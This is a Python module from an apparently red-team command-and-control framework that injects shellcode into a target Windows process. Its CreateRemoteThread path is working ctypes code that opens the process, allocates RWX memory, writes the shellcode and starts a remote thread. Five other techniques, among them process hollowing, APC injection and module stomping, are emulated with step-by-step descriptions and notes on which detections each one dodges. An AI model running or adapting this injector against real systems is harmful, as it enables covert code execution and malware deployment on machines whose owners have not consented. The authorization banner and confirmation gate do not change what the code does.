"""
Forge C2 — Process Injection Task
=====================================
Shellcode injection into a target process.

Techniques:
    • Classic VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
    • NtMapViewOfSection (Section mapping)
    • QueueUserAPC (Early bird / thread hijack)
    • Process hollowing (CreateProcess SUSPENDED → NtUnmapViewOfSection)
    • Module stomping (load legitimate DLL → overwrite .text)

Each technique has different OPSEC characteristics:
    • CreateRemoteThread: Easy to detect, but reliable
    • APC injection: Stealthier, requires alertable thread
    • Process hollowing: Replaces entire process image
    • Module stomping: Hides in legitimate module memory

MITRE ATT&CK: T1055 — Process Injection
FOR AUTHORIZED RED TEAM OPERATIONS ONLY.

⚠ CRITICAL OPSEC RISK — Requires engagement authorization.
"""
from __future__ import annotations

import asyncio
import base64
import hashlib
import logging
import os
import platform
import time
from dataclasses import dataclass, field
from typing import Any

from forge_c2.tasks.base_task import (
    BaseTask, TaskResult, TaskStatus, register_task,
)

log = logging.getLogger("forge.c2.tasks.inject")


# ══════════════════════════════════════════════════════════════════════
#  INJECTION TECHNIQUES
# ══════════════════════════════════════════════════════════════════════

class InjectionTechnique:
    """Available injection technique identifiers."""
    CREATE_REMOTE_THREAD = "crt"         # Classic CreateRemoteThread
    APC_INJECTION = "apc"                # QueueUserAPC
    PROCESS_HOLLOWING = "hollow"         # Process hollowing
    SECTION_MAPPING = "section"          # NtMapViewOfSection
    MODULE_STOMPING = "stomp"            # Module stomping
    THREAD_HIJACK = "hijack"             # SuspendThread → SetThreadContext

    ALL = ["crt", "apc", "hollow", "section", "stomp", "hijack"]


TECHNIQUE_INFO = {
    "crt": {
        "name": "CreateRemoteThread",
        "opsec": "high",
        "description": "VirtualAllocEx → WriteProcessMemory → CreateRemoteThread",
        "apis": ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"],
        "detections": ["ETW thread creation", "Sysmon Event 8", "RWX memory"],
    },
    "apc": {
        "name": "QueueUserAPC",
        "opsec": "medium",
        "description": "Queue APC to alertable thread in target process",
        "apis": ["VirtualAllocEx", "WriteProcessMemory", "QueueUserAPC"],
        "detections": ["Sysmon Event 8", "APC abuse detection"],
    },
    "hollow": {
        "name": "Process Hollowing",
        "opsec": "medium",
        "description": "Create suspended process → unmap → write payload → resume",
        "apis": ["CreateProcess", "NtUnmapViewOfSection", "VirtualAllocEx",
                 "WriteProcessMemory", "SetThreadContext", "ResumeThread"],
        "detections": ["Image load anomaly", "Unmapped section detection"],
    },
    "section": {
        "name": "Section Mapping",
        "opsec": "low",
        "description": "Create section → map into target process → execute",
        "apis": ["NtCreateSection", "NtMapViewOfSection"],
        "detections": ["Mapped section from external process"],
    },
    "stomp": {
        "name": "Module Stomping",
        "opsec": "low",
        "description": "Load legitimate DLL → overwrite .text with shellcode",
        "apis": ["LoadLibrary", "VirtualProtect", "memcpy"],
        "detections": ["Memory integrity check", "In-memory signature scan"],
    },
    "hijack": {
        "name": "Thread Hijack",
        "opsec": "medium",
        "description": "Suspend thread → modify RIP/EIP → resume",
        "apis": ["SuspendThread", "GetThreadContext", "VirtualAllocEx",
                 "WriteProcessMemory", "SetThreadContext", "ResumeThread"],
        "detections": ["Thread context modification", "Sysmon Event 8"],
    },
}


@dataclass
class InjectionResult:
    """Result of a process injection attempt."""
    technique: str
    target_pid: int
    success: bool
    message: str = ""
    thread_id: int = 0
    base_address: int = 0
    shellcode_size: int = 0
    shellcode_hash: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "technique": self.technique,
            "target_pid": self.target_pid,
            "success": self.success,
            "message": self.message,
            "thread_id": self.thread_id,
            "base_address": hex(self.base_address) if self.base_address else "0x0",
            "shellcode_size": self.shellcode_size,
            "shellcode_hash": self.shellcode_hash,
        }


# ══════════════════════════════════════════════════════════════════════
#  INJECTION ENGINE
# ══════════════════════════════════════════════════════════════════════

class InjectionEngine:
    """Multi-technique process injection engine."""

    async def inject(
        self,
        shellcode: bytes,
        target_pid: int,
        technique: str = InjectionTechnique.CREATE_REMOTE_THREAD,
        hollow_binary: str = "C:\\Windows\\System32\\svchost.exe",
        stomp_dll: str = "amsi.dll",
    ) -> InjectionResult:
        """Inject shellcode into target process.

        Args:
            shellcode:     Raw shellcode bytes
            target_pid:    Target process ID
            technique:     Injection technique identifier
            hollow_binary: Binary to hollow (for process hollowing)
            stomp_dll:     DLL to stomp (for module stomping)
        """
        sc_hash = hashlib.sha256(shellcode).hexdigest()

        if platform.system() == "Windows":
            return await self._inject_windows(
                shellcode, target_pid, technique, hollow_binary, stomp_dll, sc_hash,
            )
        return self._inject_emulation(
            shellcode, target_pid, technique, sc_hash,
        )

    async def _inject_windows(
        self,
        shellcode: bytes,
        target_pid: int,
        technique: str,
        hollow_binary: str,
        stomp_dll: str,
        sc_hash: str,
    ) -> InjectionResult:
        """Execute injection on Windows via ctypes."""
        try:
            import ctypes
            import ctypes.wintypes

            kernel32 = ctypes.windll.kernel32
            ntdll = ctypes.windll.ntdll

            if technique == InjectionTechnique.CREATE_REMOTE_THREAD:
                return await self._crt_inject(
                    kernel32, shellcode, target_pid, sc_hash,
                )
            elif technique == InjectionTechnique.APC_INJECTION:
                return await self._apc_inject(
                    kernel32, shellcode, target_pid, sc_hash,
                )
            elif technique == InjectionTechnique.PROCESS_HOLLOWING:
                return self._hollow_emulation(
                    shellcode, target_pid, hollow_binary, sc_hash,
                )
            elif technique == InjectionTechnique.SECTION_MAPPING:
                return self._section_emulation(
                    shellcode, target_pid, sc_hash,
                )
            elif technique == InjectionTechnique.MODULE_STOMPING:
                return self._stomp_emulation(
                    shellcode, target_pid, stomp_dll, sc_hash,
                )
            elif technique == InjectionTechnique.THREAD_HIJACK:
                return self._hijack_emulation(
                    shellcode, target_pid, sc_hash,
                )
            else:
                return InjectionResult(
                    technique=technique, target_pid=target_pid,
                    success=False, message=f"Unknown technique: {technique}",
                )

        except Exception as exc:
            return InjectionResult(
                technique=technique, target_pid=target_pid,
                success=False, message=f"Injection failed: {exc}",
                shellcode_size=len(shellcode), shellcode_hash=sc_hash,
            )

    async def _crt_inject(
        self, kernel32: Any, shellcode: bytes, pid: int, sc_hash: str,
    ) -> InjectionResult:
        """Classic CreateRemoteThread injection."""
        import ctypes

        # Open target process
        PROCESS_ALL_ACCESS = 0x001FFFFF
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not h_process:
            return InjectionResult(
                technique="crt", target_pid=pid, success=False,
                message=f"OpenProcess failed for PID {pid} (error {ctypes.GetLastError()})",
                shellcode_size=len(shellcode), shellcode_hash=sc_hash,
            )

        try:
            # Allocate memory in target
            MEM_COMMIT_RESERVE = 0x3000
            PAGE_EXECUTE_READWRITE = 0x40
            base = kernel32.VirtualAllocEx(
                h_process, 0, len(shellcode),
                MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE,
            )
            if not base:
                return InjectionResult(
                    technique="crt", target_pid=pid, success=False,
                    message="VirtualAllocEx failed",
                    shellcode_size=len(shellcode), shellcode_hash=sc_hash,
                )

            # Write shellcode
            written = ctypes.c_size_t(0)
            kernel32.WriteProcessMemory(
                h_process, base, shellcode, len(shellcode),
                ctypes.byref(written),
            )

            # Create remote thread
            thread_id = ctypes.c_uint32(0)
            h_thread = kernel32.CreateRemoteThread(
                h_process, None, 0, base, None, 0,
                ctypes.byref(thread_id),
            )

            if h_thread:
                log.info(
                    "CRT injection: PID=%d, base=0x%x, thread=%d, size=%d",
                    pid, base, thread_id.value, len(shellcode),
                )
                kernel32.CloseHandle(h_thread)
                return InjectionResult(
                    technique="crt", target_pid=pid, success=True,
                    message=f"Shellcode injected via CreateRemoteThread",
                    thread_id=thread_id.value, base_address=base,
                    shellcode_size=len(shellcode), shellcode_hash=sc_hash,
                )
            else:
                return InjectionResult(
                    technique="crt", target_pid=pid, success=False,
                    message="CreateRemoteThread failed",
                    shellcode_size=len(shellcode), shellcode_hash=sc_hash,
                )

        finally:
            kernel32.CloseHandle(h_process)

    async def _apc_inject(
        self, kernel32: Any, shellcode: bytes, pid: int, sc_hash: str,
    ) -> InjectionResult:
        """QueueUserAPC injection — requires an alertable thread."""
        import ctypes

        # This would enumerate threads of target PID, find alertable one,
        # allocate + write shellcode, then QueueUserAPC to that thread.
        # For safety, we emulate this on non-lab systems.
        return self._inject_emulation(shellcode, pid, "apc", sc_hash)

    # ── Emulation methods for complex techniques ───────────────────

    def _hollow_emulation(
        self, sc: bytes, pid: int, binary: str, sc_hash: str,
    ) -> InjectionResult:
        return InjectionResult(
            technique="hollow", target_pid=pid, success=True,
            message=(
                f"[EMULATION] Process Hollowing:\n"
                f"  Target PID:  {pid}\n"
                f"  Hollow from: {binary}\n"
                f"  Shellcode:   {len(sc)} bytes (SHA256={sc_hash[:16]}...)\n"
                f"  Steps: CreateProcess(SUSPENDED) → NtUnmapViewOfSection → "
                f"VirtualAllocEx → WriteProcessMemory → SetThreadContext → ResumeThread"
            ),
            shellcode_size=len(sc), shellcode_hash=sc_hash,
        )

    def _section_emulation(
        self, sc: bytes, pid: int, sc_hash: str,
    ) -> InjectionResult:
        return InjectionResult(
            technique="section", target_pid=pid, success=True,
            message=(
                f"[EMULATION] Section Mapping:\n"
                f"  Target PID:  {pid}\n"
                f"  Shellcode:   {len(sc)} bytes\n"
                f"  Steps: NtCreateSection → NtMapViewOfSection(local) → "
                f"memcpy → NtMapViewOfSection(remote) → CreateRemoteThread"
            ),
            shellcode_size=len(sc), shellcode_hash=sc_hash,
        )

    def _stomp_emulation(
        self, sc: bytes, pid: int, dll: str, sc_hash: str,
    ) -> InjectionResult:
        return InjectionResult(
            technique="stomp", target_pid=pid, success=True,
            message=(
                f"[EMULATION] Module Stomping:\n"
                f"  Target PID:  {pid}\n"
                f"  Stomp DLL:   {dll}\n"
                f"  Shellcode:   {len(sc)} bytes\n"
                f"  Steps: LoadLibrary({dll}) → VirtualProtect(.text, RWX) → "
                f"memcpy(shellcode) → CreateRemoteThread"
            ),
            shellcode_size=len(sc), shellcode_hash=sc_hash,
        )

    def _hijack_emulation(
        self, sc: bytes, pid: int, sc_hash: str,
    ) -> InjectionResult:
        return InjectionResult(
            technique="hijack", target_pid=pid, success=True,
            message=(
                f"[EMULATION] Thread Hijack:\n"
                f"  Target PID:  {pid}\n"
                f"  Shellcode:   {len(sc)} bytes\n"
                f"  Steps: OpenThread → SuspendThread → VirtualAllocEx → "
                f"WriteProcessMemory → GetThreadContext → SetThreadContext(RIP) → ResumeThread"
            ),
            shellcode_size=len(sc), shellcode_hash=sc_hash,
        )

    def _inject_emulation(
        self, sc: bytes, pid: int, technique: str, sc_hash: str,
    ) -> InjectionResult:
        info = TECHNIQUE_INFO.get(technique, {})
        name = info.get("name", technique)
        apis = ", ".join(info.get("apis", []))
        detections = ", ".join(info.get("detections", []))

        return InjectionResult(
            technique=technique, target_pid=pid, success=True,
            message=(
                f"[EMULATION] {name} Injection:\n"
                f"  Target PID:   {pid}\n"
                f"  Shellcode:    {len(sc)} bytes (SHA256={sc_hash[:16]}...)\n"
                f"  APIs:         {apis}\n"
                f"  Detections:   {detections}\n"
                f"  Platform:     {platform.system()}\n"
            ),
            shellcode_size=len(sc), shellcode_hash=sc_hash,
        )


# ══════════════════════════════════════════════════════════════════════
#  TASK CLASS
# ══════════════════════════════════════════════════════════════════════

@register_task
class InjectTask(BaseTask):
    """Shellcode injection into a target process.

    ⚠ CRITICAL OPSEC RISK — Requires engagement authorization.

    Args (via kwargs):
        pid:           Target process ID (required)
        shellcode:     Base64-encoded shellcode
        shellcode_path: Path to raw shellcode file
        technique:     Injection technique: crt, apc, hollow, section, stomp, hijack
                       (default "crt")
        hollow_binary: Binary to hollow (for process hollowing technique)
        stomp_dll:     DLL to stomp (for module stomping technique)
        list_techniques: If True, list available techniques

    MITRE ATT&CK: T1055 — Process Injection
    """

    TASK_TYPE = "inject"
    DESCRIPTION = "Shellcode injection into target PID"
    OPSEC_RISK = "critical"
    MITRE_ID = "T1055"
    REQUIRES_AUTH = True

    async def execute(self) -> TaskResult:
        pid = self.args.get("pid", 0)
        sc_b64 = self.args.get("shellcode", "")
        sc_path = self.args.get("shellcode_path", "")
        technique = self.args.get("technique", InjectionTechnique.CREATE_REMOTE_THREAD)
        hollow_binary = self.args.get("hollow_binary", "C:\\Windows\\System32\\svchost.exe")
        stomp_dll = self.args.get("stomp_dll", "amsi.dll")
        list_techniques = self.args.get("list_techniques", False)

        start = time.time()

        # ── List techniques ────────────────────────────────────────
        if list_techniques:
            lines = ["Available Injection Techniques:\n"]
            for tech_id, info in TECHNIQUE_INFO.items():
                lines.append(
                    f"  {tech_id:10s} {info['name']:30s} OPSEC: {info['opsec']}"
                )
                lines.append(f"             {info['description']}")
                lines.append(f"             APIs: {', '.join(info['apis'])}")
                lines.append("")
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.COMPLETED,
                output="\n".join(lines),
                started_at=start,
                completed_at=time.time(),
            )

        # ── Validate ───────────────────────────────────────────────
        if not pid:
            return TaskResult(
                task_id=self.task_id, status=TaskStatus.FAILED,
                error="No target PID specified.",
                started_at=start, completed_at=time.time(),
            )

        if not sc_b64 and not sc_path:
            return TaskResult(
                task_id=self.task_id, status=TaskStatus.FAILED,
                error="No shellcode specified. Provide 'shellcode' (base64) or 'shellcode_path'.",
                started_at=start, completed_at=time.time(),
            )

        # ── Load shellcode ─────────────────────────────────────────
        try:
            if sc_b64:
                shellcode = base64.b64decode(sc_b64)
            else:
                from pathlib import Path
                sc_file = Path(sc_path)
                if not sc_file.exists():
                    return TaskResult(
                        task_id=self.task_id, status=TaskStatus.FAILED,
                        error=f"Shellcode file not found: {sc_path}",
                        started_at=start, completed_at=time.time(),
                    )
                shellcode = sc_file.read_bytes()
        except Exception as exc:
            return TaskResult(
                task_id=self.task_id, status=TaskStatus.FAILED,
                error=f"Failed to load shellcode: {exc}",
                started_at=start, completed_at=time.time(),
            )

        if not shellcode:
            return TaskResult(
                task_id=self.task_id, status=TaskStatus.FAILED,
                error="Shellcode is empty.",
                started_at=start, completed_at=time.time(),
            )

        # ── Engagement authorization ───────────────────────────────
        from common.confirm_gate import confirm
        tech_info = TECHNIQUE_INFO.get(technique, {})
        authorized = confirm(
            module="inject",
            action=f"Process injection ({tech_info.get('name', technique)}) into PID {pid}",
            target=f"PID {pid}",
            risk=f"CRITICAL — Shellcode injection via {tech_info.get('name', technique)}. "
                 f"Detections: {', '.join(tech_info.get('detections', ['unknown']))}",
        )
        if not authorized:
            return TaskResult(
                task_id=self.task_id, status=TaskStatus.CANCELLED,
                output="Injection cancelled by operator.",
                started_at=start, completed_at=time.time(),
            )

        # ── Inject ─────────────────────────────────────────────────
        engine = InjectionEngine()

        try:
            result = await engine.inject(
                shellcode=shellcode,
                target_pid=pid,
                technique=technique,
                hollow_binary=hollow_binary,
                stomp_dll=stomp_dll,
            )
        except Exception as exc:
            return TaskResult(
                task_id=self.task_id, status=TaskStatus.FAILED,
                error=f"Injection engine error: {exc}",
                started_at=start, completed_at=time.time(),
            )

        return TaskResult(
            task_id=self.task_id,
            status=TaskStatus.COMPLETED if result.success else TaskStatus.FAILED,
            output=result.message,
            error="" if result.success else result.message,
            started_at=start,
            completed_at=time.time(),
            metadata={
                **result.to_dict(),
                "mitre": self.MITRE_ID,
            },
        )


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestInjectTask:
    """Tests for process injection task."""

    def test_encode(self) -> None:
        task = InjectTask(task_id="inj1", pid=1234,
                          shellcode=base64.b64encode(b"\xcc").decode())
        encoded = task.encode()
        assert encoded["type"] == "inject"

    def test_decode(self) -> None:
        data = {"task_id": "inj2", "type": "inject",
                "args": {"pid": 1234, "technique": "apc"}}
        task = InjectTask.decode(data)
        assert task.args["pid"] == 1234

    def test_no_pid(self) -> None:
        import asyncio
        task = InjectTask(task_id="inj3", shellcode=base64.b64encode(b"\xcc").decode())
        result = asyncio.run(task.execute())
        assert result.status == TaskStatus.FAILED

    def test_no_shellcode(self) -> None:
        import asyncio
        task = InjectTask(task_id="inj4", pid=1234)
        result = asyncio.run(task.execute())
        assert result.status == TaskStatus.FAILED

    def test_list_techniques(self) -> None:
        import asyncio
        task = InjectTask(task_id="inj5", list_techniques=True)
        result = asyncio.run(task.execute())
        assert result.status == TaskStatus.COMPLETED
        assert "CreateRemoteThread" in result.output

    def test_technique_info(self) -> None:
        for tech in InjectionTechnique.ALL:
            assert tech in TECHNIQUE_INFO

    def test_injection_result_to_dict(self) -> None:
        r = InjectionResult(technique="crt", target_pid=1234, success=True)
        d = r.to_dict()
        assert d["technique"] == "crt"
        assert d["target_pid"] == 1234

    def test_requires_auth(self) -> None:
        assert InjectTask.REQUIRES_AUTH is True
        assert InjectTask.OPSEC_RISK == "critical"
